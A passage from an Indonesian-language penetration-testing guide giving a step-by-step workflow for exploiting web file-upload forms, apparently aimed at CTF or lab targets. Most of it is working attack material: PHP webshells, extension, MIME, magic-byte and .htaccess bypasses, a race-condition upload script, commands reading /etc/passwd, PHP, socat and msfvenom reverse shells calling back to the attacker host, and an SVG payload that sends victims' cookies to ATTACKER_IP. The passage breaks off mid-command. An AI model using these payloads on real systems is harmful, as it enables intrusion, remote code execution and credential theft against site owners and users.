```

---

## Rule 10 — Non-Executable ≠ Dead End

Jika:

```text
shell.php → stored but not executed
```

jangan langsung menyerah.

Cari:

```text
LFI
file inclusion
image processing
parser
ZIP extraction
template processing
SVG rendering
metadata processing
```

---

## Rule 11 — Upload + LFI Adalah Chain Penting

Mental model:

```text
Upload
  +
LFI
  =
potential code execution
```

Cross-reference:

← [File 24: LFI/RFI](/docs/lfi-rfi)

---

## Rule 12 — Jangan Langsung Reverse Shell

Urutan:

```text
1. Upload
2. Locate
3. Execute test
4. Command execution
5. Reverse shell
```

Jika step 3 gagal:

```text
reverse shell juga kemungkinan besar gagal
```

---

## Rule 13 — Gunakan curl untuk Muscle Memory

Minimal hafalkan:

```bash
curl -i \
  -F 'file=@test.php' \
  http://TARGET/upload.php
```

Custom filename:

```bash
curl -i \
  -F 'file=@test.php;filename=shell.php' \
  http://TARGET/upload.php
```

Custom MIME:

```bash
curl -i \
  -F 'file=@test.php;filename=shell.php;type=image/jpeg' \
  http://TARGET/upload.php
```

Verify:

```bash
curl -i \
  http://TARGET/uploads/shell.php
```

Command test:

```bash
curl -G \
  --data-urlencode 'cmd=id' \
  http://TARGET/uploads/shell.php
```

---

# FINAL MUSCLE-MEMORY CHECKLIST

```text
[ ] Upload endpoint ditemukan
[ ] Request multipart dipahami
[ ] Parameter filename diketahui
[ ] Extension validation diketahui
[ ] MIME validation diketahui
[ ] Magic-byte validation diketahui
[ ] Upload response dibaca
[ ] Storage path diketahui
[ ] Public URL ditemukan
[ ] test.php dibuat
[ ] UPLOAD_OK berhasil/gagal dicatat
[ ] .phtml diuji jika relevan
[ ] .php5 diuji jika relevan
[ ] .phar diuji jika relevan
[ ] MIME bypass diuji
[ ] Magic bytes diuji
[ ] Double extension diuji bila logic memungkinkan
[ ] Case manipulation diuji bila relevan
[ ] Null byte hanya diuji pada legacy target
[ ] .htaccess diuji pada Apache yang relevan
[ ] SVG diuji jika accepted
[ ] ZIP extraction dianalisis jika ada
[ ] Race condition dianalisis jika ada evidence
[ ] API upload diperiksa
[ ] LFI + Upload diperiksa
[ ] Execution dibuktikan
[ ] Command execution dibuktikan
[ ] Reverse shell hanya setelah execution confirmed
```

---

# QUICK REFERENCE — 60 SECOND WORKFLOW

```text
UPLOAD FOUND
     │
     ▼
Upload benign file
     │
     ▼
Inspect request
     │
     ├── filename?
     ├── MIME?
     ├── parameter?
     └── endpoint?
     │
     ▼
Upload test.php
     │
     ├── REJECTED
     │      │
     │      ├── extension bypass
     │      ├── MIME bypass
     │      ├── magic bytes
     │      ├── case
     │      └── legacy tricks
     │
     └── ACCEPTED
            │
            ▼
       Find path
            │
            ▼
       Access file
            │
       ┌────┴────┐
       │         │
   EXECUTES   DOESN'T
       │         │
       ▼         ▼
      RCE      Analyze:
                LFI
                parser
                SVG
                ZIP
                race
                storage
                │
                ▼
             Chain vuln
```

---

# Final Principle

File Upload Testing bukan sekadar:

```text
"Upload shell.php"
```

Workflow yang benar adalah:

```text
DISCOVER
   ↓
UNDERSTAND VALIDATION
   ↓
UPLOAD
   ↓
LOCATE
   ↓
VERIFY STORAGE
   ↓
VERIFY EXECUTION
   ↓
BYPASS ONLY WHEN JUSTIFIED
   ↓
CHAIN WITH OTHER VULNERABILITY
   ↓
PROVE IMPACT
```

Pertanyaan utama yang harus otomatis muncul di kepala ketika melihat upload form:

```text
"Siapa yang menentukan filename?"
"Siapa yang menentukan MIME?"
"Bagaimana server menentukan file type?"
"Di mana file disimpan?"
"Apakah filename diubah?"
"Apakah directory dapat diakses?"
"Apakah directory executable?"
"Apakah file diproses?"
"Apakah ada LFI?"
"Apakah ada parser?"
"Apakah ada archive extraction?"
"Apakah ada race window?"
```

Jika pertanyaan tersebut sudah menjadi refleks, maka **File Upload** tidak lagi menjadi sekadar kumpulan payload, tetapi menjadi proses analisis attack surface.

---
# 25 — File Upload Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu
export LPORT="4444"
export UPLOAD_URL="http://$TARGET/upload.php"
export UPLOAD_DIR="http://$TARGET/uploads"
mkdir -p ~/fileupload_loot/{payloads,shells,output}
cd ~/fileupload_loot

echo "[*] Target     : $TARGET"
echo "[*] Upload URL : $UPLOAD_URL"
echo "[*] LHOST      : $LHOST:$LPORT"
```

**Output yang diharapkan:**

text

```
[*] Target     : 10.10.11.200
[*] Upload URL : http://10.10.11.200/upload.php
[*] LHOST      : 10.10.14.5:4444
```

---

## ═══════════════════════════════════════

## FASE 0: RECON & FINGERPRINTING

## ═══════════════════════════════════════

### Langkah 0.1 — Identifikasi Server & Technology Stack

Bash

```
# Command 1: Basic fingerprint via headers
curl -sI http://$TARGET/ | grep -iE "server|x-powered|content-type|location"

# Command 2: WhatWeb untuk tech stack detection
whatweb http://$TARGET/ 2>/dev/null

# Command 3: Nmap service scan
nmap -sV -p 80,443,8080,8443 $TARGET --open 2>/dev/null | grep -E "open|http"

# Command 4: Nikto quick scan (opsional, lebih lambat)
nikto -h http://$TARGET/ -maxtime 60 2>/dev/null | grep -iE "upload|file|php|asp"
```

**OUTPUT BERHASIL ✅ — Apache + PHP:**

text

```
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

➡️ Target adalah **Apache + PHP** → Test payload `.php`, `.phtml`, `.phar`  
➡️ Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — IIS + ASP.NET:**

text

```
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

➡️ Target adalah **IIS + ASP.NET** → Test payload `.asp`, `.aspx`  
➡️ Catat: Windows server, case-insensitive filesystem

**OUTPUT BERHASIL ✅ — Nginx + PHP-FPM:**

text

```
Server: nginx/1.18.0
X-Powered-By: PHP/8.0.0
```

➡️ Target adalah **Nginx + PHP-FPM** → Test `.php`, coba juga `.php7`

**OUTPUT BERHASIL ✅ — Tomcat/Java:**

text

```
Server: Apache-Coyote/1.1
```

➡️ Target adalah **Tomcat** → Test payload `.jsp`, `.jspx`

**OUTPUT GAGAL ❌ — Tidak ada header informatif:**

text

```
Server: cloudflare
```

➡️ Header disembunyikan. Coba:

Bash

```
# Lihat error page untuk clue technology
curl -s http://$TARGET/nonexistent_page_xyz123
# Cari clue di response body
curl -s http://$TARGET/ | grep -iE "php|asp|jsp|laravel|django|rails"
```

---

### Langkah 0.2 — Temukan Upload Endpoint

Bash

```
# Command 1: Cari upload form di halaman utama
curl -s http://$TARGET/ | grep -iE "upload|file|multipart|enctype"

# Command 2: Directory fuzzing untuk endpoint upload
ffuf -u http://$TARGET/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302,403 \
     -fc 404 \
     -t 50 \
     2>/dev/null | grep -iE "upload|file|media|attach|import"

# Command 3: Jika perlu auth, sertakan cookie
# Ganti COOKIE dengan session cookie dari browser/burp
curl -s -b "PHPSESSID=abc123" http://$TARGET/profile | grep -iE "upload|avatar|photo"

# Command 4: Cari form dengan enctype multipart
curl -s http://$TARGET/ | grep -i "multipart"
```

**OUTPUT BERHASIL ✅ — Upload endpoint ditemukan:**

text

```
<form action="/upload.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
```

➡️ Catat:

- Endpoint: `/upload.php`
- Field name: `file`
- Lanjut ke **Langkah 0.3**

**OUTPUT BERHASIL ✅ — ffuf menemukan endpoint:**

text

```
upload                  [Status: 200, Size: 1234]
media/upload            [Status: 200, Size: 890]
api/upload              [Status: 200, Size: 45]
```

➡️ Test setiap endpoint, lanjut ke **Langkah 0.3**

**OUTPUT GAGAL ❌ — Tidak ada upload endpoint terlihat:**

text

```
(tidak ada output relevan)
```

➡️ Coba:

Bash

```
# Cari di JavaScript files
curl -s http://$TARGET/ | grep -oE 'src="[^"]*\.js"' | head -20
# Lalu fetch setiap JS file dan grep
curl -s http://$TARGET/app.js | grep -iE "upload|multipart|file"

# Cari di API documentation (swagger/openapi)
curl -s http://$TARGET/api-docs 2>/dev/null
curl -s http://$TARGET/swagger.json 2>/dev/null
```

➡️ Jika benar-benar tidak ada → catat dan cek port lain, kemungkinan upload di subdomain atau vhost lain

---

### Langkah 0.3 — Analisis Upload Request dengan Burp/curl

Bash

```
# Upload file test biasa dulu untuk lihat request structure
printf 'hello world' > /tmp/test_benign.txt

curl -i \
     -F "file=@/tmp/test_benign.txt" \
     http://$TARGET/upload.php
```

**OUTPUT BERHASIL ✅ — Response informatif:**

http

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "filename": "test_benign.txt",
  "path": "/uploads/test_benign.txt",
  "url": "http://10.10.11.200/uploads/test_benign.txt"
}
```

➡️ **JACKPOT!** Server memberikan path langsung.  
➡️ Catat: `export FILE_PATH="/uploads"`, lanjut ke **Fase 1**

**OUTPUT BERHASIL ✅ — Response minimal:**

http

```
HTTP/1.1 200 OK

File uploaded successfully!
```

➡️ Path tidak diberikan. Harus prediksi path → Pergi ke **Langkah 4.1** nanti  
➡️ Lanjut ke **Fase 1**

**OUTPUT GAGAL ❌ — 403 Forbidden / 401 Unauthorized:**

http

```
HTTP/1.1 401 Unauthorized
```

➡️ Butuh autentikasi:

Bash

```
# Jika ada login page, login dulu
curl -s -c cookies.txt \
     -d "username=admin&password=admin" \
     http://$TARGET/login.php

# Lalu test upload dengan cookie
curl -i -b cookies.txt \
     -F "file=@/tmp/test_benign.txt" \
     http://$TARGET/upload.php
```

---

## ═══════════════════════════════════════

## FASE 1: PROBE — IDENTIFIKASI VALIDASI

## ═══════════════════════════════════════

> **Tujuan fase ini:** Sebelum upload payload berbahaya, pahami dulu APA yang divalidasi server. Ini akan menentukan bypass technique mana yang tepat.

### Langkah 1.1 — Buat Canary Payload (SELALU MULAI DARI SINI)

Bash

```
# Buat payload PALING SEDERHANA dulu
printf '<?php echo "UPLOAD_OK_' > ~/fileupload_loot/payloads/canary.php
printf "$(date +%s)" >> ~/fileupload_loot/payloads/canary.php
printf '"; ?>' >> ~/fileupload_loot/payloads/canary.php

cat ~/fileupload_loot/payloads/canary.php
```

**Output yang diharapkan:**

text

```
<?php echo "UPLOAD_OK_1704067200"; ?>
```

---

### Langkah 1.2 — Test Upload Langsung (No Bypass)

Bash

```
# Test 1: Upload .php langsung tanpa modifikasi
curl -i \
     -F "file=@~/fileupload_loot/payloads/canary.php;filename=canary.php" \
     http://$TARGET/upload.php 2>&1 | tee ~/fileupload_loot/output/test_direct.txt

echo "--- HTTP Status ---"
grep "HTTP/" ~/fileupload_loot/output/test_direct.txt | tail -1
echo "--- Response Body ---"
grep -A 20 "^$" ~/fileupload_loot/output/test_direct.txt | head -20
```

**OUTPUT BERHASIL ✅ — PHP diterima langsung:**

http

```
HTTP/1.1 200 OK

{"success":true,"filename":"canary.php","url":"/uploads/canary.php"}
```

➡️ **Unrestricted upload!** Tidak ada validasi extension  
➡️ Langsung ke **Fase 2 — Verify Execution**

**OUTPUT GAGAL ❌ — Extension diblokir:**

http

```
HTTP/1.1 200 OK

{"error":"File type not allowed. Only images are accepted."}
```

atau:

text

```
{"error":"Invalid extension: php"}
```

➡️ Ada **extension validation** (blacklist atau whitelist)  
➡️ Lanjut ke **Langkah 1.3 — Extension Bypass**

**OUTPUT GAGAL ❌ — MIME diblokir:**

http

```
HTTP/1.1 200 OK

{"error":"Invalid file type. Expected image/jpeg"}
```

➡️ Ada **MIME/Content-Type validation**  
➡️ Langsung ke **Langkah 1.4 — MIME Bypass**

**OUTPUT GAGAL ❌ — Magic bytes diblokir:**

http

```
HTTP/1.1 200 OK

{"error":"File content does not match image signature"}
```

➡️ Ada **magic bytes validation**  
➡️ Langsung ke **Langkah 1.5 — Magic Bytes Bypass**

---

### Langkah 1.3 — Extension Bypass (Jika extension diblokir)

Bash

```
# Jalankan upload_test.sh untuk test semua extension sekaligus
cat > ~/fileupload_loot/ext_test.sh << 'SCRIPT'
#!/bin/bash
TARGET_URL="$1"
FILE="$2"
FIELD="$3"

EXTENSIONS=("php" "phtml" "php3" "php4" "php5" "php7" "phar" "PHP" "Php" "pHp")

for ext in "${EXTENSIONS[@]}"; do
    RESPONSE=$(curl -sS \
        -o /tmp/ext_test_resp \
        -w "%{http_code}" \
        -F "${FIELD}=@${FILE};filename=test.${ext}" \
        "$TARGET_URL")
    
    BODY=$(cat /tmp/ext_test_resp 2>/dev/null)
    
    # Cek apakah accepted atau rejected
    if echo "$BODY" | grep -qiE "success|uploaded|filename"; then
        echo "[✅ ACCEPTED] .${ext} → $BODY"
    else
        echo "[❌ REJECTED] .${ext} → $BODY"
    fi
done
SCRIPT
chmod +x ~/fileupload_loot/ext_test.sh

# Jalankan
~/fileupload_loot/ext_test.sh \
    "http://$TARGET/upload.php" \
    "~/fileupload_loot/payloads/canary.php" \
    "file"
```

**OUTPUT BERHASIL ✅ — Extension alternatif diterima:**

text

```
[❌ REJECTED] .php → {"error":"File type not allowed"}
[✅ ACCEPTED] .phtml → {"success":true,"filename":"test.phtml","url":"/uploads/test.phtml"}
[❌ REJECTED] .php3 → {"error":"File type not allowed"}
```

➡️ Extension `.phtml` diterima!  
➡️ Catat: `export WORKING_EXT="phtml"`  
➡️ Lanjut ke **Fase 2 — Verify Execution** dengan extension ini

**OUTPUT GAGAL ❌ — Semua extension PHP ditolak:**

text

```
[❌ REJECTED] .php → {"error":"File type not allowed"}
[❌ REJECTED] .phtml → {"error":"File type not allowed"}
[❌ REJECTED] .phar → {"error":"File type not allowed"}
...
```

➡️ Extension validation kuat (whitelist). Cek apa yang diterima:

Bash

```
# Test extension yang diizinkan
for ext in jpg jpeg png gif txt pdf zip; do
    RESPONSE=$(curl -sS \
        -F "file=@~/fileupload_loot/payloads/canary.php;filename=test.${ext}" \
        "http://$TARGET/upload.php")
    echo "[$ext] $RESPONSE"
done
```

➡️ Catat extension apa yang diterima, lanjut ke **Langkah 1.4**

---

### Langkah 1.4 — MIME Type Bypass

Bash

```
# Test: Extension .php tapi MIME image/jpeg
curl -i \
     -F "file=@~/fileupload_loot/payloads/canary.php;filename=canary.php;type=image/jpeg" \
     http://$TARGET/upload.php

# Test: Extension .jpg tapi content PHP
printf '<?php echo "UPLOAD_OK"; ?>' > /tmp/fake_image.jpg
curl -i \
     -F "file=@/tmp/fake_image.jpg;filename=fake_image.jpg;type=image/jpeg" \
     http://$TARGET/upload.php

# Test: Kombinasi accepted ext + PHP MIME bypass
curl -i \
     -F "file=@~/fileupload_loot/payloads/canary.php;filename=canary.php;type=image/png" \
     http://$TARGET/upload.php
```

**OUTPUT BERHASIL ✅ — MIME bypass berhasil:**

http

```
HTTP/1.1 200 OK

{"success":true,"filename":"canary.php","url":"/uploads/canary.php"}
```

➡️ Server hanya cek MIME yang dikirim client (client-side MIME validation)  
➡️ Lanjut ke **Fase 2 — Verify Execution**

**OUTPUT GAGAL ❌ — MIME bypass tidak berhasil:**

text

```
{"error":"Invalid file type"}
```

➡️ Server cek magic bytes juga. Lanjut ke **Langkah 1.5**

---

### Langkah 1.5 — Magic Bytes Bypass

Bash

```
# Method 1: GIF + PHP (paling reliable untuk CTF)
{
    printf 'GIF89a'
    printf '\n'
    printf '<?php echo "UPLOAD_OK_MAGIC"; ?>\n'
} > ~/fileupload_loot/payloads/polyglot_gif.php

# Verify magic bytes
echo "--- Magic Bytes Check ---"
xxd -l 8 ~/fileupload_loot/payloads/polyglot_gif.php
file ~/fileupload_loot/payloads/polyglot_gif.php

# Upload dengan extension .php + GIF magic bytes
curl -i \
     -F "file=@~/fileupload_loot/payloads/polyglot_gif.php;filename=shell.php;type=image/gif" \
     http://$TARGET/upload.php
```

**OUTPUT BERHASIL ✅ — GIF polyglot diterima:**

text

```
{"success":true,"filename":"shell.php","url":"/uploads/shell.php"}
```

➡️ Magic bytes + MIME bypass berhasil!  
➡️ Lanjut ke **Fase 2 — Verify Execution**

**OUTPUT GAGAL ❌ — Tetap ditolak:**

text

```
{"error":"Invalid image format"}
```

➡️ Server melakukan **image decoding** (re-encode image). Polyglot sederhana tidak cukup.  
➡️ Coba dengan **ExifTool inject ke image valid:**

Bash

```
# Download gambar valid
curl -s "https://via.placeholder.com/1x1.jpg" -o /tmp/real_image.jpg 2>/dev/null || \
    dd if=/dev/urandom bs=1 count=50 2>/dev/null | \
    python3 -c "import sys; data=sys.stdin.buffer.read(); print(f'\xff\xd8\xff\xe0'.encode()+b'JFIF\x00'+data)" > /tmp/real_image.jpg

# Inject PHP ke EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' /tmp/real_image.jpg -o /tmp/injected.jpg
exiftool /tmp/injected.jpg | grep Comment

# Upload
curl -i \
     -F "file=@/tmp/injected.jpg;filename=injected.jpg;type=image/jpeg" \
     http://$TARGET/upload.php
```

➡️ Jika EXIF inject berhasil upload tapi butuh LFI untuk eksekusi → ke **Langkah 4.3**

---

### Langkah 1.6 — .htaccess Upload (Apache Only)

> Gunakan jika server adalah Apache dan extension bypass gagal

Bash

```
# Buat .htaccess yang map extension gambar ke PHP handler
printf 'AddType application/x-httpd-php .jpg\n' > /tmp/.htaccess

# Upload .htaccess
curl -i \
     -F "file=@/tmp/.htaccess;filename=.htaccess;type=text/plain" \
     http://$TARGET/upload.php
```

**OUTPUT BERHASIL ✅ — .htaccess diterima:**

text

```
{"success":true,"filename":".htaccess"}
```

➡️ Sekarang upload file `.jpg` yang berisi PHP:

Bash

```
printf '<?php system($_GET["cmd"]); ?>' > /tmp/shell.jpg

curl -i \
     -F "file=@/tmp/shell.jpg;filename=shell.jpg;type=image/jpeg" \
     http://$TARGET/upload.php
```

➡️ Jika diterima → ke **Fase 2 — Verify Execution**

**OUTPUT GAGAL ❌ — .htaccess ditolak:**

text

```
{"error":"File type not allowed"}
```

➡️ Dotfiles diblokir, atau Apache AllowOverride=None  
➡️ Coba **Double Extension**:

Bash

```
# shell.php.jpg — beberapa parser ambil extension pertama
curl -i \
     -F "file=@~/fileupload_loot/payloads/canary.php;filename=shell.php.jpg" \
     http://$TARGET/upload.php

# shell.jpg.php — extension terakhir dieksekusi
curl -i \
     -F "file=@~/fileupload_loot/payloads/canary.php;filename=shell.jpg.php" \
     http://$TARGET/upload.php
```

➡️ Jika diterima → ke **Fase 2 — Verify Execution**  
➡️ Jika semua gagal → ke **Langkah 1.7 — Race Condition**

---

### Langkah 1.7 — Race Condition Upload

> Gunakan jika: upload diterima, file ada sementara, lalu dihapus/divalidasi

Bash

```
# Deteksi race window dulu: upload dan langsung polling
curl -s \
     -F "file=@~/fileupload_loot/payloads/canary.php;filename=canary_race.php" \
     http://$TARGET/upload.php &

# Segera poll
sleep 0.1 && curl -s http://$TARGET/uploads/canary_race.php
```

**OUTPUT BERHASIL ✅ — File sempat ada:**

text

```
UPLOAD_OK_1704067200
```

➡️ Ada race window! Gunakan script paralel:

Bash

```
cat > ~/fileupload_loot/race_exploit.sh << 'RACE'
#!/bin/bash
UPLOAD_URL="$1"
TARGET_URL="$2"
FILE="$3"

echo "[*] Starting TRUE race condition"

# 50 parallel uploads
for i in $(seq 1 50); do
    curl -sS -F "file=@${FILE};filename=race_shell.php" "$UPLOAD_URL" >/dev/null &
done

# Poll 100x sambil upload berjalan
for i in $(seq 1 100); do
    RESP=$(curl -sS "$TARGET_URL/race_shell.php" 2>/dev/null)
    if echo "$RESP" | grep -q "UPLOAD_OK"; then
        echo "[!!!] RACE WON! Response: $RESP"
        break
    fi
    sleep 0.05
done

wait
echo "[*] Race finished"
RACE
chmod +x ~/fileupload_loot/race_exploit.sh

~/fileupload_loot/race_exploit.sh \
    "http://$TARGET/upload.php" \
    "http://$TARGET/uploads" \
    "~/fileupload_loot/payloads/canary.php"
```

**OUTPUT GAGAL ❌ — Semua teknik bypass gagal:**

text

```
(semua test rejected)
```

➡️ File upload mungkin bukan entry point RCE langsung  
➡️ Cek kemungkinan **Upload + LFI chain** (ke **Langkah 4.3**)  
➡️ Atau cek **SVG XSS** (ke **Langkah SVG**)  
➡️ Google: `site:github.com "[nama_aplikasi]" file upload bypass`  
➡️ Cari CVE: `searchsploit [CMS/framework name] upload`

---

## ═══════════════════════════════════════

## FASE 2: VERIFY EXECUTION

## ═══════════════════════════════════════

> **PENTING:** Jangan langsung upload reverse shell. Verify execution dulu!

### Langkah 2.1 — Temukan Path Upload (Jika Belum Diketahui)

Bash

```
# Method 1: Baca dari response upload sebelumnya
# (sudah diketahui dari Fase 1)

# Method 2: Fuzz direktori upload umum
for dir in uploads upload files media images attachments static/uploads; do
    # Cek apakah direktori ada
    STATUS=$(curl -so /dev/null -w "%{http_code}" http://$TARGET/$dir/)
    if [[ "$STATUS" == "200" || "$STATUS" == "403" ]]; then
        echo "[$STATUS] /$dir/"
    fi
done

# Method 3: Cek source HTML setelah upload untuk URL file
curl -s -F "file=@/tmp/test_benign.txt" http://$TARGET/upload.php | \
    grep -oE '"[^"]*test_benign[^"]*"'

# Method 4: Predictable filename pattern
# Upload dua file dan bandingkan namanya
curl -s -F "file=@/tmp/test1.txt" http://$TARGET/upload.php
curl -s -F "file=@/tmp/test2.txt" http://$TARGET/upload.php
```

**OUTPUT BERHASIL ✅ — Path ditemukan:**

text

```
/uploads/canary.php
```

➡️ Catat: `export SHELL_PATH="/uploads"`

---

### Langkah 2.2 — Test Execution dengan Canary

Bash

```
# Akses file yang sudah diupload
UPLOADED_FILE="$UPLOAD_DIR/canary.php"  # sesuaikan

curl -i "$UPLOADED_FILE"
```

**OUTPUT BERHASIL ✅ — PHP dieksekusi:**

http

```
HTTP/1.1 200 OK
Content-Type: text/html

UPLOAD_OK_1704067200
```

➡️ **PHP EXECUTION CONFIRMED!**  
➡️ Lanjut ke **Langkah 2.3 — Command Execution**

**OUTPUT GAGAL ❌ — PHP source ditampilkan (download):**

http

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream

<?php echo "UPLOAD_OK_1704067200"; ?>
```

➡️ File disimpan tapi **tidak dieksekusi** (static storage)  
➡️ Coba dengan `.htaccess` bypass (kembali ke **Langkah 1.6**)  
➡️ Atau cek apakah ada **LFI** untuk trigger eksekusi (ke **Langkah 4.3**)

**OUTPUT GAGAL ❌ — 404 Not Found:**

http

```
HTTP/1.1 404 Not Found
```

➡️ Path salah. Coba prediksi path lain:

Bash

```
# Coba berbagai kemungkinan path
for path in uploads upload files media images user_uploads content; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "http://$TARGET/$path/canary.php")
    echo "[$STATUS] /$path/canary.php"
done
```

**OUTPUT GAGAL ❌ — 403 Forbidden:**

http

```
HTTP/1.1 403 Forbidden
```

➡️ Direktori ada tapi access diblokir, atau file ada tapi server blokir eksekusi  
➡️ Artinya upload berhasil tapi direktori di-protect  
➡️ Coba akses file langsung (bukan direktori):

Bash

```
curl -i "http://$TARGET/uploads/canary.php"
# Berbeda dengan:
curl -i "http://$TARGET/uploads/"
```

➡️ Jika tetap 403 → direktori non-executable, cari LFI atau processing sink

---

### Langkah 2.3 — Command Execution Test

Bash

```
# Buat command execution shell
printf '<?php if(isset($_GET["cmd"])){echo "<pre>".htmlspecialchars(shell_exec($_GET["cmd"]))."</pre>";}?>' \
    > ~/fileupload_loot/payloads/cmd.php

# Upload dengan working method dari Fase 1
# (ganti extension/MIME sesuai bypass yang berhasil)
curl -i \
     -F "file=@~/fileupload_loot/payloads/cmd.php;filename=cmd.php" \
     http://$TARGET/upload.php

# Test command execution
curl -s "http://$TARGET/uploads/cmd.php?cmd=id"
curl -s "http://$TARGET/uploads/cmd.php?cmd=whoami"
curl -s "http://$TARGET/uploads/cmd.php?cmd=pwd"
```

**OUTPUT BERHASIL ✅ — Command dieksekusi:**

text

```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

➡️ **COMMAND EXECUTION CONFIRMED!**  
➡️ Collect info environment:

Bash

```
# Info sistem
curl -s "http://$TARGET/uploads/cmd.php?cmd=uname+-a"
curl -s "http://$TARGET/uploads/cmd.php?cmd=cat+/etc/passwd"
curl -s "http://$TARGET/uploads/cmd.php?cmd=env"
curl -s "http://$TARGET/uploads/cmd.php?cmd=ip+addr"
```

➡️ Lanjut ke **Fase 3 — Reverse Shell**

**OUTPUT BERHASIL ✅ — Windows target:**

text

```
<pre>nt authority\iis apppool\defaultapppool</pre>
```

➡️ Windows IIS environment!  
➡️ Commands berbeda untuk Windows:

Bash

```
curl -s "http://$TARGET/uploads/cmd.aspx?cmd=whoami"
curl -s "http://$TARGET/uploads/cmd.aspx?cmd=ipconfig"
curl -s "http://$TARGET/uploads/cmd.aspx?cmd=dir+C:\\"
```

➡️ Lanjut ke **Fase 3B — Windows Reverse Shell**

---

## ═══════════════════════════════════════

## FASE 3: REVERSE SHELL

## ═══════════════════════════════════════

### Langkah 3.1 — Setup Listener

Bash

```
# Terminal 1: Setup listener DULU sebelum trigger
nc -lvnp $LPORT
# Atau dengan rlwrap untuk better terminal
rlwrap nc -lvnp $LPORT
```

### Langkah 3.2A — Linux Reverse Shell

Bash

```
# Method 1: Gunakan php-reverse-shell dari webshells
cp /usr/share/webshells/php/php-reverse-shell.php ~/fileupload_loot/shells/revshell.php

# Edit IP dan port
sed -i "s/127.0.0.1/$LHOST/g" ~/fileupload_loot/shells/revshell.php
sed -i "s/1234/$LPORT/g" ~/fileupload_loot/shells/revshell.php

# Verify perubahan
grep -E "\\\$ip|\\\$port" ~/fileupload_loot/shells/revshell.php

# Upload reverse shell
curl -i \
     -F "file=@~/fileupload_loot/shells/revshell.php;filename=revshell.php" \
     http://$TARGET/upload.php

# Trigger (di terminal lain, sementara listener aktif)
curl -s "http://$TARGET/uploads/revshell.php"
```

**OUTPUT BERHASIL ✅ — Reverse shell diterima di listener:**

text

```
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 54321
Linux fileserver 5.4.0-149-generic #166-Ubuntu SMP x86_64 GNU/Linux
$ whoami
www-data
```

➡️ **SHELL DIDAPAT!** Stabilize dulu:

Bash

```
# Di dalam shell, stabilize:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 220
```

➡️ Lanjut ke **Fase 4 — Post Exploitation**

**OUTPUT GAGAL ❌ — Tidak ada koneksi masuk:**

text

```
(listener tetap waiting, tidak ada koneksi)
```

➡️ Kemungkinan outbound firewall. Coba port lain:

Bash

```
# Coba port 80, 443 (biasanya diizinkan outbound)
export LPORT=443
# Setup listener di port 443 (butuh sudo)
sudo nc -lvnp 443

# Atau test konektivitas dulu
curl -s "http://$TARGET/uploads/cmd.php?cmd=curl+http://$LHOST:8000/test"
# Di attacker, setup simple server:
python3 -m http.server 8000
```

**OUTPUT GAGAL ❌ — Shell langsung putus:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 54321
(langsung disconnect)
```

➡️ Shell tidak stabil. Coba upgrade:

Bash

```
# Via socat (jika tersedia di target)
# Di attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4445

# Di target (via webshell):
curl -s "http://$TARGET/uploads/cmd.php?cmd=which+socat"
# Jika ada socat:
curl -G --data-urlencode "cmd=socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4445" \
    "http://$TARGET/uploads/cmd.php"
```

---

### Langkah 3.2B — Windows Reverse Shell

Bash

```
# Method 1: ASPX reverse shell via msfvenom
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=$LHOST LPORT=$LPORT \
         -f aspx \
         -o ~/fileupload_loot/shells/revshell.aspx

# Upload
curl -i \
     -F "file=@~/fileupload_loot/shells/revshell.aspx;filename=revshell.aspx" \
     http://$TARGET/upload.aspx

# Trigger
curl -s "http://$TARGET/uploads/revshell.aspx"
```

**OUTPUT BERHASIL ✅ — Windows shell:**

text

```
Microsoft Windows [Version 10.0.17763.2628]
C:\inetpub\wwwroot\uploads> whoami
iis apppool\defaultapppool
```

➡️ Lanjut ke **[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)**

---

## ═══════════════════════════════════════

## FASE 4: ADVANCED SCENARIOS

## ═══════════════════════════════════════

### Langkah 4.1 — Prediksi Path jika Tidak Diketahui

Bash

```
# Method 1: Timing attack — upload dan langsung scan
curl -s -F "file=@~/fileupload_loot/payloads/canary.php;filename=timing_test.php" \
    http://$TARGET/upload.php &

# Segera fuzz path
ffuf -u "http://$TARGET/FUZZ/timing_test.php" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,500 \
     -t 100 \
     2>/dev/null

# Method 2: Cek response headers setelah upload
curl -i -F "file=@~/fileupload_loot/payloads/canary.php" http://$TARGET/upload.php | \
    grep -iE "location|referer|x-file|path"

# Method 3: Lihat source page setelah upload (jika ada gallery/profile update)
curl -s -b cookies.txt http://$TARGET/profile | grep -oE 'src="[^"]*"'
```

---

### Langkah 4.2 — SVG Upload untuk XSS

> Gunakan jika target hanya terima image tapi `.svg` diizinkan

Bash

```
# Buat SVG XSS payload
cat > ~/fileupload_loot/payloads/xss.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" onload="
  var x = new XMLHttpRequest();
  x.open('GET', 'http://ATTACKER_IP:8000/?cookie=' + document.cookie);
  x.send();
">
<rect width="100" height="100"/>
</svg>
SVG

# Ganti IP
sed -i "s/ATTACKER_IP/$LHOST/g" ~/fileupload_loot/payloads/xss.svg

# Setup listener untuk tangkap cookie
python3 -m http.server 8000 &

# Upload SVG
curl -i \
